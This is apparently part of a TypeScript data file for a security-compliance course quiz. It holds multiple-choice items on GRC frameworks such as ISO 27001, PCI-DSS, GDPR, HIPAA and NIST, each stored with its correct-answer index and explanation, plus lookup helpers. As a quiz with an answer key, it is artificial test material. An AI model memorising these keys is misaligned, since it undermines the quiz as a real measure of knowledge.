      { id: "cf-q10-4", question: "What is IG1 in CIS Controls?", options: ["Internet Gateway 1", "Implementation Group 1 — Essential Cyber Hygiene", "Investigation Group 1", "Incident Grade 1"], correctAnswer: 1, explanation: "IG1 is Essential Cyber Hygiene — 56 foundational safeguards protecting against ~77% of common ATT&CK techniques." },
      { id: "cf-q10-5", question: "What formula calculates Annualized Loss Expectancy?", options: ["ALE = SLE + ARO", "ALE = SLE × ARO", "ALE = SLE ÷ ARO", "ALE = SLE - ARO"], correctAnswer: 1, explanation: "ALE = SLE (Single Loss Expectancy) × ARO (Annualized Rate of Occurrence) is the core quantitative risk formula." },
      { id: "cf-q10-6", question: "Which PCI-DSS data element must never be stored after authorization?", options: ["Cardholder name", "PAN", "CVV/CVC", "Expiration date"], correctAnswer: 2, explanation: "CVV/CVC, full track data, and PINs must never be stored after transaction authorization." },
      { id: "cf-q10-7", question: "Within how many hours must a GDPR breach be reported?", options: ["24", "48", "72", "96"], correctAnswer: 2, explanation: "GDPR requires breach notification to the supervisory authority within 72 hours." },
      { id: "cf-q10-8", question: "Which SOC 2 TSC is always mandatory?", options: ["Availability", "Privacy", "Security", "Processing Integrity"], correctAnswer: 2, explanation: "Security (Common Criteria) is always required in every SOC 2 report." },
      { id: "cf-q10-9", question: "What are the four risk treatment strategies?", options: ["Plan, Do, Check, Act", "Mitigate, Transfer, Avoid, Accept", "Identify, Protect, Detect, Respond", "Harden, Detect, Isolate, Evict"], correctAnswer: 1, explanation: "The four risk treatment strategies are Mitigate, Transfer, Avoid, and Accept." },
      { id: "cf-q10-10", question: "What does the shared responsibility model define in cloud computing?", options: ["How cloud costs are shared", "Division of security duties between provider and customer", "Shared office space", "Password sharing policies"], correctAnswer: 1, explanation: "The shared responsibility model defines what the cloud provider secures vs. what the customer secures." },
      { id: "cf-q10-11", question: "How many Annex A controls does ISO 27001:2022 have?", options: ["42", "93", "114", "200"], correctAnswer: 1, explanation: "ISO 27001:2022 has 93 controls organized into 4 themes (reduced from 114 in the 2013 version)." },
      { id: "cf-q10-12", question: "What HIPAA document must vendors handling ePHI sign?", options: ["NDA", "Business Associate Agreement (BAA)", "Employment contract", "Privacy notice"], correctAnswer: 1, explanation: "A BAA is legally required for all business associates handling ePHI." },
      { id: "cf-q10-13", question: "What is the ATT&CK Navigator used for?", options: ["Network navigation", "Creating visual heatmaps of control coverage across techniques", "GPS mapping", "Code navigation"], correctAnswer: 1, explanation: "The ATT&CK Navigator creates heatmaps showing detection/prevention coverage across all ATT&CK techniques." },
      { id: "cf-q10-14", question: "What is NIST CSF Tier 4 called?", options: ["Partial", "Risk Informed", "Repeatable", "Adaptive"], correctAnswer: 3, explanation: "Tier 4: Adaptive — risk management is part of organizational culture with continuous, data-driven improvement." },
      { id: "cf-q10-15", question: "What percentage of breaches involve third parties?", options: ["About 20%", "About 40%", "About 60%", "About 80%"], correctAnswer: 2, explanation: "Approximately 60% of data breaches involve a third party (Ponemon Institute)." },
      { id: "cf-q10-16", question: "What is the CCPA revenue threshold?", options: ["$10M", "$25M", "$50M", "$100M"], correctAnswer: 1, explanation: "CCPA applies to businesses with annual gross revenue over $25 million." },
      { id: "cf-q10-17", question: "What does D3FEND provide?", options: ["Offensive hacking techniques", "A catalog of defensive countermeasures", "Compliance certifications", "Network monitoring tools"], correctAnswer: 1, explanation: "D3FEND provides a knowledge base of cybersecurity countermeasures organized by their relationship to ATT&CK techniques." },
      { id: "cf-q10-18", question: "What is a Statement of Applicability (SoA)?", options: ["A job application", "A document listing all ISO 27001 controls with applicability and justification", "A vendor contract", "A risk assessment"], correctAnswer: 1, explanation: "The SoA is the most critical ISO 27001 document listing all 93 controls with whether each is applicable and why." },
      { id: "cf-q10-19", question: "Which STRIDE category relates to unauthorized access elevation?", options: ["Spoofing", "Tampering", "Repudiation", "Elevation of Privilege"], correctAnswer: 3, explanation: "Elevation of Privilege in STRIDE refers to gaining unauthorized access rights above what was granted." },
      { id: "cf-q10-20", question: "What is continuous compliance?", options: ["Annual audit preparation", "Automated, ongoing monitoring replacing point-in-time assessments", "Weekly meetings", "Manual evidence collection"], correctAnswer: 1, explanation: "Continuous compliance uses automated tools for ongoing control monitoring and evidence collection, replacing annual audit scrambles." },
      { id: "cf-q10-21", question: "How many PCI-DSS requirements are there?", options: ["6", "10", "12", "15"], correctAnswer: 2, explanation: "PCI-DSS has 12 requirements organized into 6 goals." },
      { id: "cf-q10-22", question: "What is the PDCA cycle in ISO 27001?", options: ["Protect, Detect, Contain, Analyze", "Plan, Do, Check, Act", "Prepare, Deploy, Control, Audit", "Prevent, Discover, Correct, Adapt"], correctAnswer: 1, explanation: "Plan-Do-Check-Act is the continuous improvement cycle that ISO 27001 is built upon." },
      { id: "cf-q10-23", question: "What is the main benefit of cross-framework mapping?", options: ["It creates more work", "One control satisfies multiple frameworks, reducing duplication", "It eliminates all frameworks", "It increases audit time"], correctAnswer: 1, explanation: "Cross-mapping shows one control can satisfy multiple framework requirements simultaneously, reducing effort and cost." },
      { id: "cf-q10-24", question: "What HIPAA breach size triggers media notification?", options: ["Any breach", "100+ individuals", "500+ individuals in a state", "1000+ individuals"], correctAnswer: 2, explanation: "HIPAA requires media notification when a breach affects 500+ individuals in a single state or jurisdiction." },
      { id: "cf-q10-25", question: "Which metric measures how quickly threats are identified?", options: ["MTTR", "MTTD", "MTTC", "MTTF"], correctAnswer: 1, explanation: "MTTD (Mean Time to Detect) measures the average time to identify a security threat." },
      { id: "cf-q10-26", question: "What is residual risk?", options: ["Risk before any controls", "Risk remaining after treatment measures are applied", "Risk that was eliminated", "Initial risk assessment score"], correctAnswer: 1, explanation: "Residual risk is what remains after controls are implemented — it must fall within the organization's risk appetite." },
      { id: "cf-q10-27", question: "What are CIS Benchmarks?", options: ["General security guidelines", "Prescriptive configuration hardening guides for specific technologies", "Marketing benchmarks", "Speed tests"], correctAnswer: 1, explanation: "CIS Benchmarks are detailed, step-by-step hardening guides specifying exact configuration settings for specific platforms." },
      { id: "cf-q10-28", question: "In NIST RMF, what is the output of the Authorize step?", options: ["A vulnerability report", "An Authorization to Operate (ATO) decision", "A network diagram", "A training certificate"], correctAnswer: 1, explanation: "The Authorize step results in an ATO decision — a senior official's risk-based approval for a system to operate." },
      { id: "cf-q10-29", question: "What GDPR principle states you should collect only necessary data?", options: ["Accuracy", "Purpose Limitation", "Data Minimization", "Storage Limitation"], correctAnswer: 2, explanation: "Data Minimization is the principle that organizations should collect only the personal data necessary for the specified purpose." },
      { id: "cf-q10-30", question: "What certification is recommended for GRC career advancement?", options: ["AWS Solutions Architect", "CISA (Certified Information Systems Auditor)", "PMP", "CCNA"], correctAnswer: 1, explanation: "CISA from ISACA is one of the most valued certifications for GRC professionals, covering audit, compliance, and governance." }
    ]
  },
];

export const getQuizById = (courseId: string, quizId: string): QuizData | undefined => {
  return quizzes.find(q => q.courseId === courseId && q.quizId === quizId);
};

export const getCourseQuizzes = (courseId: string): QuizData[] => {
  return quizzes.filter(q => q.courseId === courseId);
};
